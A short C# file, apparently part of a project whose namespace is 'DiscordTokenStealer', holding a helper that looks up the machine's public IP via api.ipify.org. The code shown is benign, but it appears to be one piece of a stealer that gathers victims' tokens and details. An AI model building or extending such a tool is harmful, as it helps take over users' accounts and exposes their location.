using System.Net;

namespace DiscordTokenStealer;

public static class IpInfo
{
    public static async Task<IPAddress> GetIPAddress()
    {
        using var http = new HttpClient(new HttpClientHandler(), true);
        using var response = await http.GetAsync(new Uri("https://api.ipify.org"));
        return IPAddress.Parse(await response.Content.ReadAsStringAsync());
    }
}